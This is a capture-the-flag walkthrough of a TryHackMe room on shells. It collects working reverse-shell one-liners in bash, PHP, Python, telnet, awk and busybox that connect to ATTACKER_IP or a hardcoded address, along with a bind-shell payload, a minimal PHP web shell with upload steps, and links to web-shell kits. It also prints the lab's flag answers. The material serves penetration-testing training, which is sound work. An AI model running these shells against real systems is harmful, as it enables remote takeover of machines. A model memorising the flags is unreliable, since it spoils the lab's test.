# TryHackMe — Shells Overview walkthrough

Room URL: 

---
#  Shell Overview

## What is a Shell?

A **shell** is software that allows a user to interact with an operating system. It can be a **graphical interface**, but is most commonly a **command-line interface (CLI)** — depending on the OS running on the target system.


## Shell in Cybersecurity

In cybersecurity, a shell often refers to a **remote command-line session** that an **attacker uses** after gaining access to a compromised system. This shell allows attackers to **execute commands and run software remotely**.


##  Common Attacker Activities with a Shell

### 1. Remote System Control
- Enables the attacker to execute commands or software **remotely** on the target system.

### 2. Privilege Escalation
- If the attacker gains **limited access**, they can attempt to **escalate privileges** to gain administrative or root access.

### 3. Data Exfiltration
- Attackers can **read and extract sensitive data** from the target system using shell commands.

### 4. Persistence & Maintaining Access
- Attackers can create **backdoors**, add new users or credentials, or install tools to **keep access** for later.

### 5. Post-Exploitation Activities
- Once a shell is established, attackers can:
  - Deploy malware
  - Create hidden users
  - Delete or manipulate files

### 6. Pivoting (Accessing Other Systems)
- Shell access can serve as a **pivot point** to move through the network and target other systems. This process is known as **pivoting**.

Understanding how attackers use shells helps defenders **detect**, **analyze**, and **prevent** further exploitation.



---
# Reverse Shell Notes

A **Reverse Shell**, also called a "connect-back shell," is a commonly used technique in cyberattacks to gain access to a victim machine.


## What Is a Reverse Shell?

A reverse shell causes the **target machine to initiate a connection** back to the attacker's machine. This technique:
- **Bypasses firewalls**, as many allow outbound connections but block incoming ones.
- Enables the attacker to execute commands remotely.


## How Reverse Shells Work

The attacker uses a tool (like **Netcat**) to listen on a port, waiting for the target to connect back.

### Set up a Netcat Listener
```bash
nc -lvnp 443
```

### Explanation of Netcat Command
- `-l`: Listen for incoming connections
- `-v`: Verbose mode (gives feedback)
- `-n`: Avoid DNS lookup
- `-p 443`: Use port 443 to listen (can be any port)

**Commonly used ports for reverse shells**: 53, 80, 443, 139, 445 — to blend in with normal traffic.


## Gaining Reverse Shell Access

Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There’s a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

### Example Payload: Pipe Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
###  What Is a Pipe Reverse Shell?
A pipe reverse shell is a type of shell that uses named pipes (FIFOs) to communicate between the attacker's machine and the target system, typically over an existing connection (like TCP). It's one of the stealthier ways to gain remote access to a target because it can avoid using full-blown shell binaries or obvious command-line interaction.

### How It Works (Conceptual Flow)
1. On the target system:
  - Create two named pipes (e.g., `/tmp/in` and `/tmp/out`).
  - Redirect shell input from `/tmp/in`.
  - Redirect shell output to `/tmp/out`.
2. On the attacker’s side:
  - Maintain a connection that sends commands into /tmp/in.
  - Reads output from `/tmp/out`.

#### Payload Breakdown
- `rm -f /tmp/f` – Remove existing named pipe at `/tmp/f`
- `mkfifo /tmp/f` – Create a **named pipe** at `/tmp/f`
- `cat /tmp/f` – Read input from the pipe
- `| sh -i 2>&1` – Pipe input into an interactive shell; redirect error to output
- `| nc ATTACKER_IP ATTACKER_PORT` – Send shell I/O to attacker
- `>/tmp/f` – Write shell output back into pipe to maintain 2-way communication


## Attacker Receives the Shell

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The attacker now has full shell access to the compromised machine.

---
# Bind Shell 

## Bind Shell

A **bind shell** opens a listening port on the target machine. The attacker connects to this port to get a shell, allowing remote command execution. This approach is used when the target cannot initiate outbound connections.

### How Bind Shell Works

The following payload sets up a bind shell on the target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Breakdown of the Payload

- `rm -f /tmp/f`  
  Removes any existing named pipe (`/tmp/f`) to avoid conflicts.

- `mkfifo /tmp/f`  
  Creates a named pipe (FIFO) at `/tmp/f`. This pipe will be used for bidirectional data flow.

- `cat /tmp/f`  
  Reads input from the named pipe.

- `| bash -i 2>&1`  
  Sends the input to an interactive bash shell. The `2>&1` redirects standard error to standard output, so all output (stdout + stderr) is captured.

- `| nc -l 0.0.0.0 8080`  
  Starts a Netcat listener on all interfaces (`0.0.0.0`) at port `8080`. When an attacker connects to this port, the shell session is exposed.

- `> /tmp/f`  
  Writes the shell output back to the named pipe for sending to the attacker.

### Use on Target Machine

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Use on Attacker Machine

To connect to the bind shell:

```bash
nc -nv TARGET_IP 8080
```

**Explanation:**
- `nc` starts Netcat.
- `-n` disables DNS resolution.
- `-v` enables verbose mode.
- `TARGET_IP` is the IP of the target machine.
- `8080` is the listening port.


## Pipe Reverse Shell

In contrast to the bind shell, a **reverse shell** initiates a connection from the target to the attacker's system. The attacker sets up a listener, and the target machine connects back to it.

The pipe technique is used to emulate bidirectional communication using named pipes (FIFOs). This can be used in either bind or reverse shells. In the bind shell example above, we used the named pipe `/tmp/f` to handle both input and output.

This method is popular in restricted environments because it avoids complex tools and uses only bash and Netcat, which are often pre-installed.

---

# Shell Listeners

As we learned in previous tasks, a reverse shell will connect from the compromised target to the attacker’s machine. A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

Let’s explore some tools that can be used as listeners to interact with an incoming shell.


## Rlwrap

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

**Usage Example (Enhancing a Netcat Shell With Rlwrap):**
```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.


## Ncat

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

**Usage Example (Listening for Reverse Shells):**
```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

**Usage Example (Listening for Reverse Shells with SSL):**
```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

The `--ssl` option enables SSL encryption for the listener.


## Socat

It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

**Default Usage Example (Listening for Reverse Shell):**
```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the `STDOUT` option directs any incoming data to the terminal.


---

# Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or sends a connection in the case of a reverse shell.

Let’s explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell techniques.

---

## Bash

### Normal Bash Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
This command launches an interactive Bash shell (`-i`), then uses redirection to send both standard output and standard error to a TCP socket connected to `ATTACKER_IP` on port `443`. `>&` is used to redirect both stdout and stderr, and `0>&1` connects standard input from the same source.

---
### Bash Read Line Reverse Shell
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
This is a reverse shell written in Bash using built-in TCP support (`/dev/tcp/...`). When run on a target machine, it connects to a remote attacker’s IP and port (in this case, `ATTACKER_IP` on port `443`) and allows the attacker to send commands to be executed on the victim's system.

`exec 5<>/dev/tcp/ATTACKER_IP/443`
- `exec 5<>` opens file descriptor 5 for both reading and writing (`<>`) to the TCP connection at `/dev/tcp/ATTACKER_IP/443`.
- This establishes a connection to the attacker's listener at `IP:port`.
- File descriptor 5 now acts like a network socket.

*Think of `/dev/tcp/host/port` as a special Bash feature that allows network I/O using shell redirection.*

`cat <&5`
- Reads input from file descriptor 5 (i.e., from the attacker).
- This is the incoming stream of commands from the attacker.

`| while read line; do ... done`
- Pipes the attacker's input into a loop.
- The loop:
   - Reads each line (command) from the attacker.
   - Stores it in the variable line.
   - Executes that line as a command.

`do $line 2>&5 >&5`
- `$line` is the actual command received from the attacker.
- `2>&5`  sends stderr (error output) to file descriptor 5 (the network).
- `>&5`   sends stdout (normal output) to file descriptor 5.
- So, both output types are sent back to the attacker's listener.

---
### Bash With File Descriptor 196 Reverse Shell
```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
 **High-Level Purpose:**
This command:
- Establishes a reverse TCP connection to an attacker's listener using a custom file descriptor (`196`),
- Then uses that connection to launch an interactive shell (`sh`),
- Redirects input, output, and errors through that same TCP connection

`0<&196`
- This tells Bash to read from file descriptor 196 and assign it to standard input (`0`).
- At this point, `196` hasn't been opened yet—so this part does nothing meaningful right now, but it’s preparing for the connection.

`exec 196<>/dev/tcp/ATTACKER_IP/443`
- This is the actual connection step.
- `exec 196<>` opens file descriptor `196` for both reading and writing (`<>`).
- `/dev/tcp/...` is a Bash feature that lets you interact with network sockets like files.
- So this line establishes a TCP connection to the attacker's machine.

`sh <&196 >&196 2>&196`
- This runs a new shell (`sh`) and:
- `<&196`: Reads commands from the attacker (file descriptor 196 → standard input),
- `>&196`: Sends stdout (output) to the attacker,
- `2>&196`: Sends stderr (errors) to the attacker.
Together, this makes the shell fully interactive over the network. The attacker can type commands and receive both output and errors back, like a remote terminal.

---
### Bash With File Descriptor 5 Reverse Shell
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
This command creates an interactive reverse shell using Bash and file descriptor 5, sending input/output to the attacker's IP and port (usually where a Netcat or Ncat listener is waiting).

`bash -i`
- Starts an interactive Bash shell (`-i` = interactive).
- This allows for command history, prompts, job control, etc., like a normal terminal session.

`5<> /dev/tcp/ATTACKER_IP/443`
- Opens file descriptor 5 to read and write (`<>`) to a TCP connection with the attacker.
- Bash's special `/dev/tcp/` feature lets you treat network connections like files.

*🔗 This essentially says: “Connect to the attacker’s IP on port 443, and treat that connection as file descriptor 5.”*

`0<&5`
- Redirects stdin (`0`) to come from fd `5`.
- → So, input comes from the attacker's socket.

`1>&5`
- Redirects stdout (`1`) to go to fd `5`.
- → So, output of commands is sent back to the attacker.

`2>&5`
- Redirects stderr (`2`) (errors) to go to fd `5` too.
- → So, any errors are also sent back to the attacker.

---
## PHP

### PHP Reverse Shell Using the `exec` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
**What It Does:**

This one-liner:
- Uses PHP to connect to a remote attacker’s machine (via TCP),
- Then launches a shell (sh) and routes all input/output/error through that connection.

`php -r '...'`
- The `-r` flag tells PHP to run the code provided in quotes directly (no need for a separate `.php` file)

`$sock = fsockopen("ATTACKER_IP", 443);`
- Opens a TCP connection to the attacker's IP and port 443 using `fsockopen()`.
- Returns a stream socket, which becomes file descriptor 3 by default in PHP when you open a resource like this.

`exec("sh <&3 >&3 2>&3");`
- Executes a new shell (`sh`) on the victim's system.
- This shell:
   - Reads input from fd 3 (`<&3`) — the attacker's socket.
   - Sends output to fd 3 (`>&3`) — so the attacker sees the results.
   - Sends errors to fd 3 too (`2>&3`) — to ensure complete interaction.
So the attacker can type commands remotely, and see the shell's output, just like a terminal session.

---
### PHP Reverse Shell Using the `shell_exec` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to `exec`, but `shell_exec()` returns the command output as a string. Used for command execution and result collection.

---

### PHP Reverse Shell Using the `system` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
- `system()` executes the command and immediately displays output. Useful for real-time interaction through the browser or terminal.
- Ideal for interactive shells or web shells.
- Less flexible than `exec()` or `shell_exec()` when handling the result, but great for direct command execution with visible output.
---

### PHP Reverse Shell Using the `passthru` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
- `passthru()` executes commands and directly outputs raw data. Effective when working with binary data over the connection.
- Unlike `system()`, it does not buffer or interpret the output — it sends it as-is.
- Best when the command produces binary data (like sending images or files).
- In a reverse shell context, it works just like `system()`, but may behave more "raw" and direct, especially over a network stream.
 
  
---

### PHP Reverse Shell Using the `popen` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
Opens a process pointer using `popen()` for command execution. Enables read access from the executed process, allowing shell interaction.

# PHP Command Execution Functions Comparison (for Reverse Shells)

This table compares different PHP functions used for executing system commands in reverse shell or web shell scenarios.

| Function     | Executes Command | Captures Output           | Displays Output     | Output Type         | Best Use Case                        |
|--------------|------------------|----------------------------|----------------------|----------------------|--------------------------------------|
| `exec()`     | ✅               | ✅ (last line only)        | ❌                   | String (last line)   | Quiet output processing              |
| `shell_exec()`| ✅              | ✅ (entire output)         | ❌                   | String (all output)  | Capture full output as a string      |
| `system()`   | ✅               | ✅ (last line) + Display   | ✅ (as it runs)      | Printed text         | Direct CLI-style interaction         |
| `passthru()` | ✅               | ❌                         | ✅ (raw, binary-safe)| Raw binary/text      | Best for binary/raw output streaming |
| `popen()`    | ✅               | ✅ (via file handle/pipe) | ❌ (unless echoed)   | Resource handle      | Stream output gradually (line-by-line) |

## ✅ TL;DR: Which One Should You Use?

| Use Case                         | Best Function |
|----------------------------------|---------------|
| Simple reverse shell             | `system()`    |
| Reverse shell with binary data   | `passthru()`  |
| Capture full output as string    | `shell_exec()`|
| Minimal shell, last-line only    | `exec()`      |
| Custom streaming logic           | `popen()`     |

---

## Python

### Python Reverse Shell with Environment Variables
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;
s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
Sets environment variables for the attacker's host and port. Python creates a socket, connects, duplicates I/O file descriptors to use the socket, and spawns a pseudo-terminal for interactive access.
1. Setting Environment Variables
  - RHOST: The attacker's IP address.
  - RPORT: The port number (443 in this case) the attacker is listening on.

2. Python Code Execution
`python -c 'import sys,socket,os,pty;`
  - This line uses the `python -c `command to execute a Python one-liner. The import statement loads the necessary modules:
  - `sys`: Provides access to system-specific parameters.
  - `socket`: Allows networking (TCP connection).
  - `os`: Interacts with the operating system, such as reading environment variables.
  - `pty`: Spawns and controls pseudo-terminals.

3. Creating a TCP Socket and Connecting to the Attacker
```Python
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
```
  - `socket.socket()` creates a new socket object.
  - `s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))` connects to the attacker's machine using the IP (`RHOST`) and port (`RPORT`) stored in environment variables.

4. Redirecting Input/Output to the Socket
`[os.dup2(s.fileno(),fd) for fd in (0,1,2)];`
  - This line redirects the input, output, and error streams to the attacker's socket:
  - `os.dup2(s.fileno(), fd)` duplicates the file descriptor of the socket `(s.fileno())` to:
       - `fd=0` → stdin (input stream)
       - `fd=1` → stdout (output stream)
       - `fd=2` → stderr (error stream)
This means the shell will now use the socket for all input/output, allowing full interaction with the compromised system.

5. Spawning an Interactive Bash Shell
`pty.spawn("bash")'`
  - pty.spawn("bash") spawns an interactive bash shell using a pseudo-terminal. This allows the attacker to interact with the shell as if they were using a local terminal, 
    making the experience more seamless (supporting features like clear screen, arrow keys, etc.).


---

### Python Reverse Shell with `subprocess` Module
```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("bash")'
```
Same core idea: connects to an IP, redirects I/O via `dup2`, and spawns an interactive bash shell using `pty`.

---

### Short Python Reverse Shell
```bash
python -c 'import os,pty,socket;
s=socket.socket();s.connect(("ATTACKER_IP",443));
[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
A shorter version of the reverse shell script. Still creates a TCP connection and redirects input/output/error via `dup2()`.

---

## Others

### Telnet Reverse Shell
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
Creates a named FIFO pipe (`mkfifo`). Telnet connects to the attacker, sending input to `sh`, and output is piped back through the FIFO.

---

### AWK Reverse Shell
```bash
awk 'BEGIN {
s = "/inet/tcp/0/ATTACKER_IP/443";
while(42) {
  do {
    printf "shell>" |& s;
    s |& getline c;
    if(c) {
      while ((c |& getline) > 0) print $0 |& s;
      close(c);
    }
  } while(c != "exit")
  close(s);
}}' /dev/null
```
Leverages AWK’s internal TCP support to create an infinite loop connection to the attacker. Executes any command sent and returns results over the same socket.

---

### BusyBox Reverse Shell
```bash
busybox nc ATTACKER_IP 443 -e sh
```
Uses BusyBox’s implementation of Netcat (`nc`) to connect to the attacker's IP and execute a shell (`sh`) upon successful connection.

---
# Web Shells

A **web shell** is a script written in a language supported by a compromised web server that executes commands through the web server itself. It allows attackers to interact with the server’s OS, often with the same privileges as the web server process.

Web shells are typically uploaded using vulnerabilities like:
- Unrestricted File Upload  
- File Inclusion (LFI/RFI)  
- Command Injection  
- Unauthorized Access  

They can be hidden in various places and evade detection while allowing full control over the compromised server.

---

## Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

## Explanation:


`if (isset($_GET['cmd'])) {`

- `isset()`: checks whether a variable is set and not null.
- `$_GET['cmd']`: means it is looking for a GET parameter called `cmd` in the URL.
- This line basically says: “If someone accesses this script and includes `?cmd=somecommand` in the URL, then execute the code inside the `{}`.”

`system($_GET['cmd']);`

- `system()` is a built-in PHP function that:
    - Executes a shell command on the server,
    - Outputs the result directly to the web page.
- `$_GET['cmd']` will be the command you passed through the URL.

## Deployment
1. Save it as shell.php
2. Upload it to the target server (e.g., via a file upload vulnerability)
3. Access it through the browser:

## Example URL to execute whoami:

```bash
http://victim.com/uploads/shell.php?cmd=whoami
```

This executes whoami on the server and displays the result in the browser.

## Popular Web Shells Available Online
Here are some widely used web shells written in PHP, often used by attackers for their extended functionality:

1. [p0wny-shell](https://github.com/flozz/p0wny-shell)
   - Minimalistic single-file shell
   - Lightweight
   - Remote command execution via a small web interface
![image](https://github.com/user-attachments/assets/fa3adcb8-316b-4629-a86c-02dc89334ae5)

2. [b374k shell](https://github.com/b374k/b374k)
   - Feature-rich web shell
   - File manager, command execution, and more
   - User-friendly interface
![image](https://github.com/user-attachments/assets/abce5415-3f89-4d8f-8a8c-694672307b84)

3. [c99 shell](https://www.r57shell.net/single.php?id=13)
   - Robust and full-featured
   - Often heavily obfuscated
   - Includes network tools, file handling, and SQL integration
![image](https://github.com/user-attachments/assets/8efa6775-2374-4ecd-a201-ae1566ac6b80)

You can find more web shells at: https://www.r57shell.net/index.php. 

---
# Practical Task

let’s get the flag in the format THM{} from the vulnerable web server. Click on the Start Machine button to start the challenge. After that, it will be accessible on the following URLs:

- 10.10.170.217:8080 hosts the landing page
- 10.10.170.217:8081 hosts the web application that is vulnerable to command injection.
- 10.10.170.217:8082 hosts the web application that is vulnerable to an unrestricted file upload.


## Answer the questions below

---
**Q1. Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?**

- Go to the landing page located in `10.10.170.217:8080` then click on Reverse/Bind task
- ![image](https://github.com/user-attachments/assets/77a32e23-3ec5-4bfa-8bbc-fe1b05816f74)
- set the netcat listener to listen for incoming connection `nc -lvnp 443`
- ![image](https://github.com/user-attachments/assets/e6ac7f99-fd54-4df8-bdec-9ddd15ca41d2)
- inject this payload into the input field `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f` change the attack ip to your machine ip and the port to your netcat listener, in my case it is `443`
- ![image](https://github.com/user-attachments/assets/d9b01975-637b-49ad-9baa-af70e80b4cc1)
- Once the payload has successfully executed, you'll get a reverse shell. from there navigate to the remote directory `cd /` and cat the `flag.txt` file
- ![image](https://github.com/user-attachments/assets/dc843882-9e71-428e-92b8-8aad7e368cf1)

Ans: ***THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}***

---
**Q2. Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?**

- First create a `shell.php` file in your machine
- ![image](https://github.com/user-attachments/assets/f294d5d7-66fe-43b0-b1e5-86a5ee473743)
- upload the `shell.php` file to `10.10.170.217:8082`
- ![image](https://github.com/user-attachments/assets/c129ce6d-40db-4b75-a961-ec3a4eb6bc15)
- in the hint, it says that all files are stored in the `/uploads/` directory of the website
- navigate to the `10.10.170.217:8082/uploads/shell.php?cmd=cat /flag.txt` and feed the command to` cat flag.txt` file
- ![image](https://github.com/user-attachments/assets/dd2e8b0b-10e4-4bac-bd8e-a688a9f05b73)
 
Ans: ***THM{202bb14ed12120b31300cfbbbdd35998786b44e5}***

---
# Conclution

Reverse Shells establish a connection from a compromised machine back to an attacker’s system. Bind Shells, on the other hand, listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.

